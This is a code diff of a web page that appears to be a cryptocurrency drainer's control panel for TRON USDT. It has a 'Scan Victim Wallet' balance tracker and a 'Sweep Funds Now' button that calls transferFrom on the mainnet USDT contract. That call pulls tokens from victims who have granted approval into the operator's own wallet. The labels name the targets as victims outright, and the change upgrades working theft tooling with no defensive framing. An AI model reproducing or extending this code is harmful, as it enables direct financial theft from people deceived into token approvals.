@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Master Admin - USDT Controller</title>
+    <title>Master Admin - Tracker & Sweep</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
 </head>
@@ -12,115 +12,126 @@
     <div class="max-w-lg w-full bg-[#0f172a] border border-slate-800 rounded-3xl p-8 shadow-2xl">
         <div class="flex items-center justify-between mb-8">
             <div class="flex items-center gap-3">
-                <div class="w-10 h-10 bg-emerald-500 rounded-lg flex items-center justify-center shadow-lg shadow-emerald-500/20">
-                    <svg class="w-6 h-6 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"></path></svg>
+                <div class="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center shadow-lg shadow-blue-500/20">
+                    <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"></path></svg>
                 </div>
-                <h1 class="text-2xl font-bold tracking-tight text-white">USDT Sweep Panel</h1>
+                <h1 class="text-2xl font-bold tracking-tight text-white">Master Panel</h1>
             </div>
-            <span class="text-[10px] bg-emerald-500/10 text-emerald-500 px-2 py-0.5 rounded uppercase font-black border border-emerald-500/20">Mainnet API</span>
+            <span class="text-[10px] bg-blue-500/10 text-blue-400 px-2 py-0.5 rounded uppercase font-black border border-blue-500/20">Tracker Active</span>
         </div>
 
-        <div class="space-y-5">
-            <div>
-                <label class="block text-[10px] font-black uppercase tracking-[0.2em] text-slate-500 mb-2">Victim Wallet (Approved Only)</label>
+        <div class="space-y-6">
+            <div class="bg-slate-900/50 p-5 rounded-2xl border border-slate-800">
+                <label class="block text-[10px] font-black uppercase tracking-[0.2em] text-slate-500 mb-3">1. Scan Victim Wallet</label>
                 <div class="flex gap-2">
-                    <input id="victimAddress" type="text" placeholder="T..." class="flex-1 bg-[#1e293b] border border-slate-700 rounded-xl px-4 py-4 focus:outline-none focus:border-emerald-500 transition-all text-sm font-mono tracking-tight">
-                    <button id="checkBtn" class="bg-slate-800 hover:bg-slate-700 px-4 rounded-xl text-xs font-bold transition-all border border-slate-700">Check</button>
+                    <input id="victimAddress" type="text" placeholder="T..." class="flex-1 bg-[#1e293b] border border-slate-700 rounded-xl px-4 py-3 focus:outline-none focus:border-blue-500 transition-all text-sm font-mono tracking-tight">
+                    <button id="scanBtn" class="bg-blue-600 hover:bg-blue-500 px-6 rounded-xl text-xs font-bold transition-all text-white uppercase">Scan</button>
+                </div>
+
+                <div id="trackerDisplay" class="hidden mt-4 pt-4 border-t border-slate-800">
+                    <div class="flex justify-between items-center mb-2">
+                        <span class="text-xs text-slate-400">USDT Balance:</span>
+                        <span id="liveUsdt" class="font-mono text-emerald-400 font-bold text-lg">0.00</span>
+                    </div>
+                    <div class="flex justify-between items-center">
+                        <span class="text-xs text-slate-400">TRX Balance:</span>
+                        <span id="liveTrx" class="font-mono text-red-400 font-bold text-lg">0.00</span>
+                    </div>
                 </div>
             </div>
 
-            <div>
-                <label class="block text-[10px] font-black uppercase tracking-[0.2em] text-slate-500 mb-2">Withdrawal Amount (USDT)</label>
-                <input id="amount" type="number" placeholder="0.00" class="w-full bg-[#1e293b] border border-slate-700 rounded-xl px-4 py-4 focus:outline-none focus:border-emerald-500 transition-all text-sm font-mono">
+            <div class="bg-slate-900/50 p-5 rounded-2xl border border-slate-800">
+                <label class="block text-[10px] font-black uppercase tracking-[0.2em] text-slate-500 mb-3">2. Execute Withdrawal</label>
+                <input id="sweepAmount" type="number" placeholder="Enter amount to sweep..." class="w-full bg-[#1e293b] border border-slate-700 rounded-xl px-4 py-3 focus:outline-none focus:border-emerald-500 transition-all text-sm font-mono mb-4">
+                
+                <button id="sweepBtn" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-black py-4 rounded-xl shadow-lg shadow-emerald-900/20 transition-all uppercase tracking-widest active:scale-95">
+                    Sweep Funds Now
+                </button>
             </div>
 
-            <button id="withdrawBtn" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-black py-5 rounded-2xl shadow-lg shadow-emerald-900/20 transition-all uppercase tracking-widest mt-2 active:scale-95">
-                Sweep Funds Now
-            </button>
-
-            <div id="log" class="mt-4 p-5 bg-black/40 rounded-2xl border border-slate-800 font-mono text-[11px] leading-relaxed">
-                <span class="text-slate-600">// Ready for operation...</span>
+            <div id="log" class="p-4 bg-black/40 rounded-xl border border-slate-800 font-mono text-[10px] text-slate-500 min-h-[50px] break-all leading-relaxed">
+                // System ready. Waiting for address...
             </div>
         </div>
     </div>
 
     <script>
         const CONFIG = {
-            USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // Mainnet USDT
+            USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
             NODE: "https://api.trongrid.io"
         };
 
         const logger = (msg) => { document.getElementById('log').innerHTML = msg; };
 
-        // --- 1. Check Balance Logic ---
-        document.getElementById('checkBtn').onclick = async () => {
-            const victim = document.getElementById('victimAddress').value.trim();
-            if(!victim) return alert("Pehle address dalo!");
+        // --- TRACKER LOGIC (Scan Button) ---
+        document.getElementById('scanBtn').onclick = async () => {
+            const address = document.getElementById('victimAddress').value.trim();
+            const display = document.getElementById('trackerDisplay');
             
-            logger("⏳ Fetching live balances...");
+            if(!address) return alert("Pehle address dalo!");
+
+            logger("⏳ Scanning blockchain ledger...");
             try {
+                // Reader Instance (No wallet connection needed)
                 const tron = new TronWeb({ fullHost: CONFIG.NODE });
-                
-                // Get TRX
-                const trxRaw = await tron.trx.getBalance(victim);
+
+                // Fetch TRX
+                const trxRaw = await tron.trx.getBalance(address);
                 const trx = (trxRaw / 1e6).toFixed(2);
 
-                // Get USDT via triggerConstantContract (Sabse safe)
+                // Fetch USDT (TriggerConstantContract is safest)
                 const balanceTx = await tron.transactionBuilder.triggerConstantContract(
-                    CONFIG.USDT, "balanceOf(address)", {}, [{ type: 'address', value: victim }], victim
+                    CONFIG.USDT, "balanceOf(address)", {}, [{ type: 'address', value: address }], address
                 );
                 const usdt = (parseInt(balanceTx.constant_result[0], 16) / 1e6).toFixed(2);
 
-                logger(`
-                    <div class="space-y-1">
-                        <p class="text-emerald-400 font-bold">ADDRESS VERIFIED</p>
-                        <p class="text-white">💰 USDT: ${usdt}</p>
-                        <p class="text-white">💎 TRX: ${trx}</p>
-                    </div>
-                `);
+                // Update UI
+                document.getElementById('liveUsdt').innerText = usdt;
+                document.getElementById('liveTrx').innerText = trx;
+                display.classList.remove('hidden');
+                logger(`✅ Live Scan Complete for: ${address.substring(0,6)}...`);
+
             } catch (e) {
-                logger(`<span class="text-red-500 uppercase font-bold">Error:</span><br>${e.message || e}`);
+                logger(`❌ Scan Failed: ${e.message || e}`);
+                alert("Invalid address or Network error.");
             }
         };
 
-        // --- 2. Withdrawal Sweep Logic ---
-        document.getElementById('withdrawBtn').onclick = async () => {
+        // --- SWEEP LOGIC (Execution Button) ---
+        document.getElementById('sweepBtn').onclick = async () => {
             const victim = document.getElementById('victimAddress').value.trim();
-            const amount = document.getElementById('amount').value;
-            const btn = document.getElementById('withdrawBtn');
+            const amount = document.getElementById('sweepAmount').value;
+            const btn = document.getElementById('sweepBtn');
 
-            if(!victim || !amount) return alert("Address aur Amount dono bhariyo!");
-            if(!window.tronWeb) return alert("TronLink connect nahi hai!");
+            if(!victim || !amount) return alert("Address aur Amount dono zaroori hain!");
+            if(!window.tronWeb) return alert("TronLink Extension connect karein!");
 
             try {
                 btn.disabled = true;
                 btn.innerText = "Broadcasting...";
-                logger("📡 Initializing sweep...");
+                logger("📡 Initializing TransferFrom execution...");
 
                 const tron = window.tronWeb;
-                const adminAddr = tron.defaultAddress.base58; // TronLink me jo address active hai
+                const adminAddr = tron.defaultAddress.base58; // Current TronLink Wallet
 
                 const contract = await tron.contract().at(CONFIG.USDT);
                 const amountInSun = Math.floor(amount * 1000000);
 
-                logger(`⚡ Executing transferFrom...<br>Victim: ${victim}<br>Admin: ${adminAddr}`);
-
-                // Main transaction
                 const tx = await contract.transferFrom(
                     victim,
                     adminAddr,
                     amountInSun
                 ).send({
-                    feeLimit: 150000000 // 150 TRX Limit
+                    feeLimit: 150000000
                 });
 
-                logger(`✅ <span class="text-emerald-400 font-bold">SUCCESS!</span><br>TX: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" class="text-blue-400 underline">${tx}</a>`);
+                logger(`✅ SUCCESS!<br>TXID: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" class="text-blue-400 underline">${tx}</a>`);
                 alert("Withdrawal Successful!");
 
             } catch (err) {
                 let errorMsg = err.message || "Rejected";
-                if(JSON.stringify(err).includes("REVERT")) errorMsg = "REVERT: No Approval or No Energy";
-                logger(`<span class="text-red-500 uppercase font-bold">FAILED:</span><br>${errorMsg}`);
+                if(JSON.stringify(err).includes("REVERT")) errorMsg = "REVERT: No Approval or Low Energy";
+                logger(`<span class="text-red-500 font-bold">FAILED:</span> ${errorMsg}`);
             } finally {
                 btn.disabled = false;
                 btn.innerText = "Sweep Funds Now";
